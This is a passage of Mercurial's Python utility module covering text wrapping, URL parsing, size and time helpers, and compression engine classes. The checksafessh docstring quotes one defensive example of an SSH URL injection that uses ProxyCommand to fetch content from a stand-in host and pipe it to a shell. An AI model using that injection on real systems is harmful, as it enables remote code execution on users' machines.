            chunks.reverse()

            while chunks:

                # Start the list of chunks that will make up the current line.
                # cur_len is just the length of all the chunks in cur_line.
                cur_line = []
                cur_len = 0

                # Figure out which static string will prefix this line.
                if lines:
                    indent = self.subsequent_indent
                else:
                    indent = self.initial_indent

                # Maximum width for this line.
                width = self.width - len(indent)

                # First chunk on line is whitespace -- drop it, unless this
                # is the very beginning of the text (i.e. no lines started yet).
                if self.drop_whitespace and chunks[-1].strip() == r"" and lines:
                    del chunks[-1]

                while chunks:
                    l = colwidth(chunks[-1])

                    # Can at least squeeze this chunk onto the current line.
                    if cur_len + l <= width:
                        cur_line.append(chunks.pop())
                        cur_len += l

                    # Nope, this line is full.
                    else:
                        break

                # The current line is full, and the next chunk is too big to
                # fit on *any* line (not just this one).
                if chunks and colwidth(chunks[-1]) > width:
                    self._handle_long_word(chunks, cur_line, cur_len, width)

                # If the last chunk on this line is all whitespace, drop it.
                if self.drop_whitespace and cur_line and cur_line[-1].strip() == r"":
                    del cur_line[-1]

                # Convert current line back to a string and store it in list
                # of all lines (return value).
                if cur_line:
                    lines.append(indent + r"".join(cur_line))

            return lines

    global MBTextWrapper
    MBTextWrapper = tw
    return tw(**kwargs)


def wrap(line, width, initindent="", hangindent=""):
    maxindent = max(len(hangindent), len(initindent))
    if width <= maxindent:
        # adjust for weird terminal size
        width = max(78, maxindent + 1)
    line = line.decode(
        pycompat.sysstr(encoding.encoding), pycompat.sysstr(encoding.encodingmode)
    )
    initindent = initindent.decode(
        pycompat.sysstr(encoding.encoding), pycompat.sysstr(encoding.encodingmode)
    )
    hangindent = hangindent.decode(
        pycompat.sysstr(encoding.encoding), pycompat.sysstr(encoding.encodingmode)
    )
    wrapper = MBTextWrapper(
        width=width, initial_indent=initindent, subsequent_indent=hangindent
    )
    return wrapper.fill(line).encode(pycompat.sysstr(encoding.encoding))


if pyplatform.python_implementation() == "CPython" and sys.version_info < (3, 0):
    # There is an issue in CPython that some IO methods do not handle EINTR
    # correctly. The following table shows what CPython version (and functions)
    # are affected (buggy: has the EINTR bug, okay: otherwise):
    #
    #                | < 2.7.4 | 2.7.4 to 2.7.12 | >= 3.0
    #   --------------------------------------------------
    #    fp.__iter__ | buggy   | buggy           | okay
    #    fp.read*    | buggy   | okay [1]        | okay
    #
    # [1]: fixed by changeset 67dc99a989cd in the cpython hg repo.
    #
    # Here we workaround the EINTR issue for fileobj.__iter__. Other methods
    # like "read*" are ignored for now, as Python < 2.7.4 is a minority.
    #
    # Although we can workaround the EINTR issue for fp.__iter__, it is slower:
    # "for x in fp" is 4x faster than "for x in iter(fp.readline, '')" in
    # CPython 2, because CPython 2 maintains an internal readahead buffer for
    # fp.__iter__ but not other fp.read* methods.
    #
    # On modern systems like Linux, the "read" syscall cannot be interrupted
    # when reading "fast" files like on-disk files. So the EINTR issue only
    # affects things like pipes, sockets, ttys etc. We treat "normal" (S_ISREG)
    # files approximately as "fast" files and use the fast (unsafe) code path,
    # to minimize the performance impact.
    if sys.version_info >= (2, 7, 4):
        # fp.readline deals with EINTR correctly, use it as a workaround.
        def _safeiterfile(fp):
            return iter(fp.readline, "")

    else:
        # fp.read* are broken too, manually deal with EINTR in a stupid way.
        # note: this may block longer than necessary because of bufsize.
        def _safeiterfile(fp, bufsize=4096):
            fd = fp.fileno()
            line = ""
            while True:
                try:
                    buf = os.read(fd, bufsize)
                except OSError as ex:
                    # os.read only raises EINTR before any data is read
                    if ex.errno == errno.EINTR:
                        continue
                    else:
                        raise
                line += buf
                if "\n" in buf:
                    splitted = line.splitlines(True)
                    line = ""
                    for l in splitted:
                        if l[-1] == "\n":
                            yield l
                        else:
                            line = l
                if not buf:
                    break
            if line:
                yield line

    def iterfile(fp):
        fastpath = True
        if type(fp) is file:  # noqa
            fastpath = stat.S_ISREG(os.fstat(fp.fileno()).st_mode)
        if fastpath:
            return fp
        else:
            return _safeiterfile(fp)


else:
    # PyPy and CPython 3 do not have the EINTR issue thus no workaround needed.
    def iterfile(fp):
        return fp


def iterlines(iterator):
    for chunk in iterator:
        for line in chunk.splitlines():
            yield line


def expandpath(path):
    return os.path.expanduser(os.path.expandvars(path))


def hgcmd():
    """Return the command used to execute current hg

    This is different from hgexecutable() because on Windows we want
    to avoid things opening new shell windows like batch files, so we
    get either the python call or current executable.
    """
    if mainfrozen():
        if getattr(sys, "frozen", None) == "macosx_app":
            # Env variable set by py2app
            return [encoding.environ["EXECUTABLEPATH"]]
        else:
            return [pycompat.sysexecutable]
    return gethgcmd()


def rundetached(args, condfn):
    """Execute the argument list in a detached process.

    condfn is a callable which is called repeatedly and should return
    True once the child process is known to have started successfully.
    At this point, the child process PID is returned. If the child
    process fails to start or finishes before condfn() evaluates to
    True, return -1.
    """
    # Windows case is easier because the child process is either
    # successfully starting and validating the condition or exiting
    # on failure. We just poll on its PID. On Unix, if the child
    # process fails to start, it will be left in a zombie state until
    # the parent wait on it, which we cannot do since we expect a long
    # running process on success. Instead we listen for SIGCHLD telling
    # us our child process terminated.
    terminated = set()

    def handler(signum, frame):
        terminated.add(os.wait())

    prevhandler = None
    SIGCHLD = getattr(signal, "SIGCHLD", None)
    if SIGCHLD is not None:
        prevhandler = signal.signal(SIGCHLD, handler)
    try:
        pid = spawndetached(args)
        while not condfn():
            if (pid in terminated or not testpid(pid)) and not condfn():
                return -1
            time.sleep(0.1)
        return pid
    finally:
        if prevhandler is not None:
            signal.signal(signal.SIGCHLD, prevhandler)


def interpolate(prefix, mapping, s, fn=None, escape_prefix=False):
    """Return the result of interpolating items in the mapping into string s.

    prefix is a single character string, or a two character string with
    a backslash as the first character if the prefix needs to be escaped in
    a regular expression.

    fn is an optional function that will be applied to the replacement text
    just before replacement.

    escape_prefix is an optional flag that allows using doubled prefix for
    its escaping.
    """
    fn = fn or (lambda s: s)
    patterns = "|".join(mapping.keys())
    if escape_prefix:
        patterns += "|" + prefix
        if len(prefix) > 1:
            prefix_char = prefix[1:]
        else:
            prefix_char = prefix
        mapping[prefix_char] = prefix_char
    r = remod.compile(br"%s(%s)" % (prefix, patterns))
    return r.sub(lambda x: fn(mapping[x.group()[1:]]), s)


def getport(port):
    """Return the port for a given network service.

    If port is an integer, it's returned as is. If it's a string, it's
    looked up using socket.getservbyname(). If there's no matching
    service, error.Abort is raised.
    """
    try:
        return int(port)
    except ValueError:
        pass

    try:
        return socket.getservbyname(port)
    except socket.error:
        raise Abort(_("no port number associated with service '%s'") % port)


_booleans = {
    "1": True,
    "yes": True,
    "true": True,
    "on": True,
    "always": True,
    "0": False,
    "no": False,
    "false": False,
    "off": False,
    "never": False,
}


def parsebool(s):
    """Parse s into a boolean.

    If s is not a valid boolean, returns None.
    """
    return _booleans.get(s.lower(), None)


def parseint(s):
    """Parse s into an integer.

    If s is not a valid integer, returns None.
    """
    try:
        return int(s)
    except (TypeError, ValueError):
        return None


_hextochr = dict(
    (a + b, chr(int(a + b, 16))) for a in string.hexdigits for b in string.hexdigits
)


class url(object):
    r"""Reliable URL parser.

    This parses URLs and provides attributes for the following
    components:

    <scheme>://<user>:<passwd>@<host>:<port>/<path>?<query>#<fragment>

    Missing components are set to None. The only exception is
    fragment, which is set to '' if present but empty.

    If parsefragment is False, fragment is included in query. If
    parsequery is False, query is included in path. If both are
    False, both fragment and query are included in path.

    See http://www.ietf.org/rfc/rfc2396.txt for more information.

    Note that for backward compatibility reasons, bundle URLs do not
    take host names. That means 'bundle://../' has a path of '../'.

    Examples:

    >>> url(b'http://www.ietf.org/rfc/rfc2396.txt')
    <url scheme: 'http', host: 'www.ietf.org', path: 'rfc/rfc2396.txt'>
    >>> url(b'ssh://[::1]:2200//home/joe/repo')
    <url scheme: 'ssh', host: '[::1]', port: '2200', path: '/home/joe/repo'>
    >>> url(b'file:///home/joe/repo')
    <url scheme: 'file', path: '/home/joe/repo'>
    >>> url(b'file:///c:/temp/foo/')
    <url scheme: 'file', path: 'c:/temp/foo/'>
    >>> url(b'bundle:foo')
    <url scheme: 'bundle', path: 'foo'>
    >>> url(b'bundle://../foo')
    <url scheme: 'bundle', path: '../foo'>
    >>> url(br'c:\foo\bar')
    <url path: 'c:\\foo\\bar'>
    >>> url(br'\\blah\blah\blah')
    <url path: '\\\\blah\\blah\\blah'>
    >>> url(br'\\blah\blah\blah#baz')
    <url path: '\\\\blah\\blah\\blah', fragment: 'baz'>
    >>> url(br'file:///C:\users\me')
    <url scheme: 'file', path: 'C:\\users\\me'>

    Authentication credentials:

    >>> url(b'ssh://joe:xyz@x/repo')
    <url scheme: 'ssh', user: 'joe', passwd: 'xyz', host: 'x', path: 'repo'>
    >>> url(b'ssh://joe@x/repo')
    <url scheme: 'ssh', user: 'joe', host: 'x', path: 'repo'>

    Query strings and fragments:

    >>> url(b'http://host/a?b#c')
    <url scheme: 'http', host: 'host', path: 'a', query: 'b', fragment: 'c'>
    >>> url(b'http://host/a?b#c', parsequery=False, parsefragment=False)
    <url scheme: 'http', host: 'host', path: 'a?b#c'>

    Empty path:

    >>> url(b'')
    <url path: ''>
    >>> url(b'#a')
    <url path: '', fragment: 'a'>
    >>> url(b'http://host/')
    <url scheme: 'http', host: 'host', path: ''>
    >>> url(b'http://host/#a')
    <url scheme: 'http', host: 'host', path: '', fragment: 'a'>

    Only scheme:

    >>> url(b'http:')
    <url scheme: 'http'>
    """

    _safechars = "!~*'()+"
    _safepchars = "/!~*'()+:\\"
    _matchscheme = remod.compile("^[a-zA-Z0-9+.\\-]+:").match

    def __init__(self, path, parsequery=True, parsefragment=True):
        # We slowly chomp away at path until we have only the path left
        self.scheme = self.user = self.passwd = self.host = None
        self.port = self.path = self.query = self.fragment = None
        self._localpath = True
        self._hostport = ""
        self._origpath = path

        if parsefragment and "#" in path:
            path, self.fragment = path.split("#", 1)

        # special case for Windows drive letters and UNC paths
        if hasdriveletter(path) or path.startswith("\\\\"):
            self.path = path
            return

        # For compatibility reasons, we can't handle bundle paths as
        # normal URLS
        if path.startswith("bundle:"):
            self.scheme = "bundle"
            path = path[7:]
            if path.startswith("//"):
                path = path[2:]
            self.path = path
            return

        if self._matchscheme(path):
            parts = path.split(":", 1)
            if parts[0]:
                self.scheme, path = parts
                self._localpath = False

        if not path:
            path = None
            if self._localpath:
                self.path = ""
                return
        else:
            if self._localpath:
                self.path = path
                return

            if parsequery and "?" in path:
                path, self.query = path.split("?", 1)
                if not path:
                    path = None
                if not self.query:
                    self.query = None

            # // is required to specify a host/authority
            if path and path.startswith("//"):
                parts = path[2:].split("/", 1)
                if len(parts) > 1:
                    self.host, path = parts
                else:
                    self.host = parts[0]
                    path = None
                if not self.host:
                    self.host = None
                    # path of file:///d is /d
                    # path of file:///d:/ is d:/, not /d:/
                    if path and not hasdriveletter(path):
                        path = "/" + path

            if self.host and "@" in self.host:
                self.user, self.host = self.host.rsplit("@", 1)
                if ":" in self.user:
                    self.user, self.passwd = self.user.split(":", 1)
                if not self.host:
                    self.host = None

            # Don't split on colons in IPv6 addresses without ports
            if (
                self.host
                and ":" in self.host
                and not (self.host.startswith("[") and self.host.endswith("]"))
            ):
                self._hostport = self.host
                self.host, self.port = self.host.rsplit(":", 1)
                if not self.host:
                    self.host = None

            if (
                self.host
                and self.scheme == "file"
                and self.host not in ("localhost", "127.0.0.1", "[::1]")
            ):
                raise Abort(_("file:// URLs can only refer to localhost"))

        self.path = path

        # leave the query string escaped
        for a in ("user", "passwd", "host", "port", "path", "fragment"):
            v = getattr(self, a)
            if v is not None:
                setattr(self, a, urlreq.unquote(v))

    @encoding.strmethod
    def __repr__(self):
        attrs = []
        for a in (
            "scheme",
            "user",
            "passwd",
            "host",
            "port",
            "path",
            "query",
            "fragment",
        ):
            v = getattr(self, a)
            if v is not None:
                attrs.append("%s: %r" % (a, v))
        return "<url %s>" % ", ".join(attrs)

    def __bytes__(self):
        r"""Join the URL's components back into a URL string.

        Examples:

        >>> bytes(url(b'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'))
        'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'
        >>> bytes(url(b'http://user:pw@host:80/?foo=bar&baz=42'))
        'http://user:pw@host:80/?foo=bar&baz=42'
        >>> bytes(url(b'http://user:pw@host:80/?foo=bar%3dbaz'))
        'http://user:pw@host:80/?foo=bar%3dbaz'
        >>> bytes(url(b'ssh://user:pw@[::1]:2200//home/joe#'))
        'ssh://user:pw@[::1]:2200//home/joe#'
        >>> bytes(url(b'http://localhost:80//'))
        'http://localhost:80//'
        >>> bytes(url(b'http://localhost:80/'))
        'http://localhost:80/'
        >>> bytes(url(b'http://localhost:80'))
        'http://localhost:80/'
        >>> bytes(url(b'bundle:foo'))
        'bundle:foo'
        >>> bytes(url(b'bundle://../foo'))
        'bundle:../foo'
        >>> bytes(url(b'path'))
        'path'
        >>> bytes(url(b'file:///tmp/foo/bar'))
        'file:///tmp/foo/bar'
        >>> bytes(url(b'file:///c:/tmp/foo/bar'))
        'file:///c:/tmp/foo/bar'
        >>> print(url(br'bundle:foo\bar'))
        bundle:foo\bar
        >>> print(url(br'file:///D:\data\hg'))
        file:///D:\data\hg
        """
        if self._localpath:
            s = self.path
            if self.scheme == "bundle":
                s = "bundle:" + s
            if self.fragment:
                s += "#" + self.fragment
            return s

        s = self.scheme + ":"
        if self.user or self.passwd or self.host:
            s += "//"
        elif self.scheme and (
            not self.path or self.path.startswith("/") or hasdriveletter(self.path)
        ):
            s += "//"
            if hasdriveletter(self.path):
                s += "/"
        if self.user:
            s += urlreq.quote(self.user, safe=self._safechars)
        if self.passwd:
            s += ":" + urlreq.quote(self.passwd, safe=self._safechars)
        if self.user or self.passwd:
            s += "@"
        if self.host:
            if not (self.host.startswith("[") and self.host.endswith("]")):
                s += urlreq.quote(self.host)
            else:
                s += self.host
        if self.port:
            s += ":" + urlreq.quote(self.port)
        if self.host:
            s += "/"
        if self.path:
            # TODO: similar to the query string, we should not unescape the
            # path when we store it, the path might contain '%2f' = '/',
            # which we should *not* escape.
            s += urlreq.quote(self.path, safe=self._safepchars)
        if self.query:
            # we store the query in escaped form.
            s += "?" + self.query
        if self.fragment is not None:
            s += "#" + urlreq.quote(self.fragment, safe=self._safepchars)
        return s

    __str__ = encoding.strmethod(__bytes__)

    def authinfo(self):
        user, passwd = self.user, self.passwd
        try:
            self.user, self.passwd = None, None
            s = bytes(self)
        finally:
            self.user, self.passwd = user, passwd
        if not self.user:
            return (s, None)
        # authinfo[1] is passed to urllib2 password manager, and its
        # URIs must not contain credentials. The host is passed in the
        # URIs list because Python < 2.4.3 uses only that to search for
        # a password.
        return (s, (None, (s, self.host), self.user, self.passwd or ""))

    def isabs(self):
        if self.scheme and self.scheme != "file":
            return True  # remote URL
        if hasdriveletter(self.path):
            return True  # absolute for our purposes - can't be joined()
        if self.path.startswith(br"\\"):
            return True  # Windows UNC path
        if self.path.startswith("/"):
            return True  # POSIX-style
        return False

    def localpath(self):
        if self.scheme == "file" or self.scheme == "bundle":
            path = self.path or "/"
            # For Windows, we need to promote hosts containing drive
            # letters to paths with drive letters.
            if hasdriveletter(self._hostport):
                path = self._hostport + "/" + self.path
            elif self.host is not None and self.path and not hasdriveletter(path):
                path = "/" + path
            return path
        return self._origpath

    def islocal(self):
        """whether localpath will return something that posixfile can open"""
        return not self.scheme or self.scheme == "file" or self.scheme == "bundle"


def hasscheme(path):
    return bool(url(path).scheme)


def hasdriveletter(path):
    return path and path[1:2] == ":" and path[0:1].isalpha()


def urllocalpath(path):
    return url(path, parsequery=False, parsefragment=False).localpath()


def checksafessh(path):
    """check if a path / url is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    path = urlreq.unquote(path)
    if path.startswith("ssh://-") or path.startswith("svn+ssh://-"):
        raise error.Abort(_("potentially unsafe url: %r") % (path,))


def hidepassword(u):
    """hide user credential in a url string"""
    u = url(u)
    if u.passwd:
        u.passwd = "***"
    return bytes(u)


def removeauth(u):
    """remove all authentication information from a url string"""
    u = url(u)
    u.user = u.passwd = None
    return str(u)


timecount = unitcountfn(
    (1, 1e3, _("%.0f s")),
    (100, 1, _("%.1f s")),
    (10, 1, _("%.2f s")),
    (1, 1, _("%.3f s")),
    (100, 0.001, _("%.1f ms")),
    (10, 0.001, _("%.2f ms")),
    (1, 0.001, _("%.3f ms")),
    (100, 0.000001, _("%.1f us")),
    (10, 0.000001, _("%.2f us")),
    (1, 0.000001, _("%.3f us")),
    (100, 0.000000001, _("%.1f ns")),
    (10, 0.000000001, _("%.2f ns")),
    (1, 0.000000001, _("%.3f ns")),
)

_timenesting = [0]


def timed(topfunc=None, annotation=None):
    """Report the execution time of a function call to stderr.

    During development, use as a decorator when you need to measure
    the cost of a function, e.g. as follows:

    @util.timed
    def foo(a, b, c):
        pass

    @util.timed(annotation='this might be the bottleneck')
    def bar(a, b, c):
        pass
    """

    def outerwrapper(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            start = timer()
            indent = 2
            _timenesting[0] += indent
            # Note that we cannot reuse the name `annotation` for the `annt`
            # below. The reason is that we want `annotation` in the rvalue
            # to be captured from the environment, and whichever name is
            # used as lvalue to be a local variable. Because of Python2's
            # semantics, the decision of whether the name is local of non-local
            # is made based on whethe lexically first operation on this name
            # is a write or a read. Here lexically first operation is an
            # assignment, so whichever name we use as an lvalue, it will
            # be local for *all* purposes in this function, even if it is
            # used in the rvalue
            annt = annotation or func.__name__
            try:
                return func(*args, **kwargs)
            finally:
                elapsed = timer() - start
                _timenesting[0] -= indent
                stderr.write(
                    "%s%s: %s\n" % (" " * _timenesting[0], annt, timecount(elapsed))
                )

        return wrapper

    if topfunc is None:
        return outerwrapper
    else:
        return outerwrapper(topfunc)


_sizeunits = (
    ("b", 1),
    ("kb", 2 ** 10),
    ("mb", 2 ** 20),
    ("gb", 2 ** 30),
    ("tb", 2 ** 40),
    ("m", 2 ** 20),
    ("k", 2 ** 10),
    ("g", 2 ** 30),
    ("t", 2 ** 40),
)


def sizetoint(s):
    """Convert a space specifier to a byte count.

    >>> sizetoint(b'30')
    30
    >>> sizetoint(b'2.2kb')
    2252
    >>> sizetoint(b'6M')
    6291456
    >>> sizetoint(b'1 gb')
    1073741824
    """
    t = s.strip().lower()
    try:
        # Iterate in reverse order so we check "b" last, otherwise we'd match
        # "b" instead of "kb".
        for k, u in reversed(_sizeunits):
            if t.endswith(k):
                return int(float(t[: -len(k)]) * u)
        return int(t)
    except ValueError:
        raise error.ParseError(_("couldn't parse size: %s") % s)


def inttosize(value):
    """Convert a number to a string representing the numbers of bytes.

    >>> inttosize(30)
    '30.0B'
    >>> inttosize(1.6 * 1024)
    '1.6KB'
    >>> inttosize(2.4 * 1024 * 1024)
    '2.4MB'
    >>> inttosize(8.1 * 1024 * 1024 * 1024)
    '8.1GB'
    """
    last = _sizeunits[0]

    for suffix, unit in _sizeunits:
        if value < unit:
            break
        last = (suffix, unit)

    return "{0:.1f}{1:s}".format((value / float(last[1])), last[0].upper())


class hooks(object):
    """A collection of hook functions that can be used to extend a
    function's behavior. Hooks are called in lexicographic order,
    based on the names of their sources."""

    def __init__(self):
        self._hooks = []

    def add(self, source, hook):
        self._hooks.append((source, hook))

    def __call__(self, *args):
        self._hooks.sort(key=lambda x: x[0])
        results = []
        for source, hook in self._hooks:
            results.append(hook(*args))
        return results


def getstackframes(skip=0, line=" %-*s in %s\n", fileline="%s:%s", depth=0):
    """Yields lines for a nicely formatted stacktrace.
    Skips the 'skip' last entries, then return the last 'depth' entries.
    Each file+linenumber is formatted according to fileline.
    Each line is formatted according to line.
    If line is None, it yields:
      length of longest filepath+line number,
      filepath+linenumber,
      function

    Not be used in production code but very convenient while developing.
    """
    entries = [
        (fileline % (fn, ln), func)
        for fn, ln, func, _text in traceback.extract_stack()[: -skip - 1]
    ][-depth:]
    if entries:
        fnmax = max(len(entry[0]) for entry in entries)
        for fnln, func in entries:
            if line is None:
                yield (fnmax, fnln, func)
            else:
                yield line % (fnmax, fnln, func)


def debugstacktrace(msg="stacktrace", skip=0, f=stderr, otherf=stdout, depth=0):
    """Writes a message to f (stderr) with a nicely formatted stacktrace.
    Skips the 'skip' entries closest to the call, then show 'depth' entries.
    By default it will flush stdout first.
    It can be used everywhere and intentionally does not require an ui object.
    Not be used in production code but very convenient while developing.
    """
    if otherf:
        otherf.flush()
    f.write("%s at:\n" % msg.rstrip())
    for line in getstackframes(skip + 1, depth=depth):
        f.write(line)
    f.flush()


class puredirs(object):
    """a multiset of directory names from a dirstate or manifest"""

    def __init__(self, map, skip=None):
        self._dirs = {}
        addpath = self.addpath
        if safehasattr(map, "iteritems") and skip is not None:
            for f, s in map.iteritems():
                if s[0] != skip:
                    addpath(f)
        else:
            for f in map:
                addpath(f)

    def addpath(self, path):
        dirs = self._dirs
        for base in finddirs(path):
            if base in dirs:
                dirs[base] += 1
                return
            dirs[base] = 1

    def delpath(self, path):
        dirs = self._dirs
        for base in finddirs(path):
            if dirs[base] > 1:
                dirs[base] -= 1
                return
            del dirs[base]

    def __iter__(self):
        return iter(self._dirs)

    def __contains__(self, d):
        return d in self._dirs


dirs = getattr(parsers, "dirs", puredirs)


def finddirs(path):
    pos = path.rfind("/")
    while pos != -1:
        yield path[:pos]
        pos = path.rfind("/", 0, pos)


# compression code

SERVERROLE = "server"
CLIENTROLE = "client"

compewireprotosupport = collections.namedtuple(
    u"compenginewireprotosupport", (u"name", u"serverpriority", u"clientpriority")
)


class compressormanager(object):
    """Holds registrations of various compression engines.

    This class essentially abstracts the differences between compression
    engines to allow new compression formats to be added easily, possibly from
    extensions.

    Compressors are registered against the global instance by calling its
    ``register()`` method.
    """

    def __init__(self):
        self._engines = {}
        # Bundle spec human name to engine name.
        self._bundlenames = {}
        # Internal bundle identifier to engine name.
        self._bundletypes = {}
        # Revlog header to engine name.
        self._revlogheaders = {}
        # Wire proto identifier to engine name.
        self._wiretypes = {}

    def __getitem__(self, key):
        return self._engines[key]

    def __contains__(self, key):
        return key in self._engines

    def __iter__(self):
        return iter(self._engines.keys())

    def register(self, engine):
        """Register a compression engine with the manager.

        The argument must be a ``compressionengine`` instance.
        """
        if not isinstance(engine, compressionengine):
            raise ValueError(_("argument must be a compressionengine"))

        name = engine.name()

        if name in self._engines:
            raise error.Abort(_("compression engine %s already registered") % name)

        bundleinfo = engine.bundletype()
        if bundleinfo:
            bundlename, bundletype = bundleinfo

            if bundlename in self._bundlenames:
                raise error.Abort(_("bundle name %s already registered") % bundlename)
            if bundletype in self._bundletypes:
                raise error.Abort(
                    _("bundle type %s already registered by %s")
                    % (bundletype, self._bundletypes[bundletype])
                )

            # No external facing name declared.
            if bundlename:
                self._bundlenames[bundlename] = name

            self._bundletypes[bundletype] = name

        wiresupport = engine.wireprotosupport()
        if wiresupport:
            wiretype = wiresupport.name
            if wiretype in self._wiretypes:
                raise error.Abort(
                    _("wire protocol compression %s already " "registered by %s")
                    % (wiretype, self._wiretypes[wiretype])
                )

            self._wiretypes[wiretype] = name

        revlogheader = engine.revlogheader()
        if revlogheader and revlogheader in self._revlogheaders:
            raise error.Abort(
                _("revlog header %s already registered by %s")
                % (revlogheader, self._revlogheaders[revlogheader])
            )

        if revlogheader:
            self._revlogheaders[revlogheader] = name

        self._engines[name] = engine

    @property
    def supportedbundlenames(self):
        return set(self._bundlenames.keys())

    @property
    def supportedbundletypes(self):
        return set(self._bundletypes.keys())

    def forbundlename(self, bundlename):
        """Obtain a compression engine registered to a bundle name.

        Will raise KeyError if the bundle type isn't registered.

        Will abort if the engine is known but not available.
        """
        engine = self._engines[self._bundlenames[bundlename]]
        if not engine.available():
            raise error.Abort(
                _("compression engine %s could not be loaded") % engine.name()
            )
        return engine

    def forbundletype(self, bundletype):
        """Obtain a compression engine registered to a bundle type.

        Will raise KeyError if the bundle type isn't registered.

        Will abort if the engine is known but not available.
        """
        engine = self._engines[self._bundletypes[bundletype]]
        if not engine.available():
            raise error.Abort(
                _("compression engine %s could not be loaded") % engine.name()
            )
        return engine

    def supportedwireengines(self, role, onlyavailable=True):
        """Obtain compression engines that support the wire protocol.

        Returns a list of engines in prioritized order, most desired first.

        If ``onlyavailable`` is set, filter out engines that can't be
        loaded.
        """
        assert role in (SERVERROLE, CLIENTROLE)

        attr = "serverpriority" if role == SERVERROLE else "clientpriority"

        engines = [self._engines[e] for e in self._wiretypes.values()]
        if onlyavailable:
            engines = [e for e in engines if e.available()]

        def getkey(e):
            # Sort first by priority, highest first. In case of tie, sort
            # alphabetically. This is arbitrary, but ensures output is
            # stable.
            w = e.wireprotosupport()
            return -1 * getattr(w, attr), w.name

        return list(sorted(engines, key=getkey))

    def forwiretype(self, wiretype):
        engine = self._engines[self._wiretypes[wiretype]]
        if not engine.available():
            raise error.Abort(
                _("compression engine %s could not be loaded") % engine.name()
            )
        return engine

    def forrevlogheader(self, header):
        """Obtain a compression engine registered to a revlog header.

        Will raise KeyError if the revlog header value isn't registered.
        """
        return self._engines[self._revlogheaders[header]]


compengines = compressormanager()


class compressionengine(object):
    """Base class for compression engines.

    Compression engines must implement the interface defined by this class.
    """

    def name(self):
        """Returns the name of the compression engine.

        This is the key the engine is registered under.

        This method must be implemented.
        """
        raise NotImplementedError()

    def available(self):
        """Whether the compression engine is available.

        The intent of this method is to allow optional compression engines
        that may not be available in all installations (such as engines relying
        on C extensions that may not be present).
        """
        return True

    def bundletype(self):
        """Describes bundle identifiers for this engine.

        If this compression engine isn't supported for bundles, returns None.

        If this engine can be used for bundles, returns a 2-tuple of strings of
        the user-facing "bundle spec" compression name and an internal
        identifier used to denote the compression format within bundles. To
        exclude the name from external usage, set the first element to ``None``.

        If bundle compression is supported, the class must also implement
        ``compressstream`` and `decompressorreader``.

        The docstring of this method is used in the help system to tell users
        about this engine.
        """
        return None

    def wireprotosupport(self):
        """Declare support for this compression format on the wire protocol.

        If this compression engine isn't supported for compressing wire
        protocol payloads, returns None.

        Otherwise, returns ``compenginewireprotosupport`` with the following
        fields:

        * String format identifier
        * Integer priority for the server
        * Integer priority for the client

        The integer priorities are used to order the advertisement of format
        support by server and client. The highest integer is advertised
        first. Integers with non-positive values aren't advertised.

        The priority values are somewhat arbitrary and only used for default
        ordering. The relative order can be changed via config options.

        If wire protocol compression is supported, the class must also implement
        ``compressstream`` and ``decompressorreader``.
        """
        return None

    def revlogheader(self):
        """Header added to revlog chunks that identifies this engine.

        If this engine can be used to compress revlogs, this method should
        return the bytes used to identify chunks compressed with this engine.
        Else, the method should return ``None`` to indicate it does not
        participate in revlog compression.
        """
        return None

    def compressstream(self, it, opts=None):
        """Compress an iterator of chunks.

        The method receives an iterator (ideally a generator) of chunks of
        bytes to be compressed. It returns an iterator (ideally a generator)
        of bytes of chunks representing the compressed output.

        Optionally accepts an argument defining how to perform compression.
        Each engine treats this argument differently.
        """
        raise NotImplementedError()

    def decompressorreader(self, fh):
        """Perform decompression on a file object.

        Argument is an object with a ``read(size)`` method that returns
        compressed data. Return value is an object with a ``read(size)`` that
        returns uncompressed data.
        """
        raise NotImplementedError()

    def revlogcompressor(self, opts=None):
        """Obtain an object that can be used to compress revlog entries.

        The object has a ``compress(data)`` method that compresses binary
        data. This method returns compressed binary data or ``None`` if
        the data could not be compressed (too small, not compressible, etc).
        The returned data should have a header uniquely identifying this
        compression format so decompression can be routed to this engine.
        This header should be identified by the ``revlogheader()`` return
        value.

        The object has a ``decompress(data)`` method that decompresses
        data. The method will only be called if ``data`` begins with
        ``revlogheader()``. The method should return the raw, uncompressed
        data or raise a ``RevlogError``.

        The object is reusable but is not thread safe.
        """
        raise NotImplementedError()


class _zlibengine(compressionengine):
    def name(self):
        return "zlib"

    def bundletype(self):
        """zlib compression using the DEFLATE algorithm.

        All Mercurial clients should support this format. The compression
        algorithm strikes a reasonable balance between compression ratio
        and size.
        """
        return "gzip", "GZ"

    def wireprotosupport(self):
        return compewireprotosupport("zlib", 20, 20)

    def revlogheader(self):
        return "x"

    def compressstream(self, it, opts=None):
        opts = opts or {}

        z = zlib.compressobj(opts.get("level", -1))
        for chunk in it:
            data = z.compress(chunk)
            # Not all calls to compress emit data. It is cheaper to inspect
            # here than to feed empty chunks through generator.
            if data:
                yield data

        yield z.flush()

    def decompressorreader(self, fh):
        def gen():
            d = zlib.decompressobj()
            for chunk in filechunkiter(fh):
                while chunk:
                    # Limit output size to limit memory.
                    yield d.decompress(chunk, 2 ** 18)
                    chunk = d.unconsumed_tail

        return chunkbuffer(gen())

    class zlibrevlogcompressor(object):
        def compress(self, data):
            insize = len(data)
            # Caller handles empty input case.
            assert insize > 0

            if insize < 44:
                return None

            elif insize <= 1000000:
                compressed = zlib.compress(data)
                if len(compressed) < insize:
                    return compressed
                return None

            # zlib makes an internal copy of the input buffer, doubling
            # memory usage for large inputs. So do streaming compression
            # on large inputs.
            else:
                z = zlib.compressobj()
                parts = []
                pos = 0
                while pos < insize:
                    pos2 = pos + 2 ** 20
                    parts.append(z.compress(data[pos:pos2]))
                    pos = pos2
                parts.append(z.flush())

                if sum(map(len, parts)) < insize:
                    return "".join(parts)
                return None

        def decompress(self, data):
            try:
                return zlib.decompress(data)
            except zlib.error as e:
                raise error.RevlogError(_("revlog decompress error: %s") % str(e))

    def revlogcompressor(self, opts=None):
        return self.zlibrevlogcompressor()


compengines.register(_zlibengine())


class _bz2engine(compressionengine):
    def name(self):
        return "bz2"

    def bundletype(self):
        """An algorithm that produces smaller bundles than ``gzip``.

        All Mercurial clients should support this format.

        This engine will likely produce smaller bundles than ``gzip`` but
        will be significantly slower, both during compression and
        decompression.

        If available, the ``zstd`` engine can yield similar or better
        compression at much higher speeds.
        """
